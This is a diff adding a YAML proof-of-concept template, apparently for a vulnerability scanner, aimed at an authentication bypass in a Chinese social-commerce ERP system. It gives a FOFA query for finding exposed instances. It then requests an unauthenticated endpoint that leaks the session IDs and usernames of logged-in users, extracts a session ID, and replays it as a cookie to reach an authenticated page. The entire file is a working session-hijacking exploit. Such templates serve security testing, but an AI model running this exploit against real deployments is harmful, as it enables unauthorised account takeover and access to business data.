@@ -1,0 +1,22 @@
+id: poc-yaml-yun-shikong-erp-online-identity-authentication-bypass
+info:
+  name: 云时空社会化商业ERP系统 online 身份认证绕过漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 云时空社会化商业ERP系统
+  fofa: app="云时空社会化商业ERP系统"
+requests:
+- method: GET
+  path: /sys/user/online
+  expression: status_code == 200 && contains(body,"\"sessionid\":") && contains(body,"\"username\":")
+  output:
+  - regex_match(body,`sessionid":"(?P<sessionid>[0-9a-zA-Z-]+)"`)
+- method: GET
+  path: /index
+  headers:
+    Cookie: emscm.session.id={{.sessionid}}
+  expression: status_code == 200 && contains(body,"退出登录") && contains(body,"用户设置")
+    && contains(title,"云时空社会化商业ERP")
+variables: {}
+transport: http
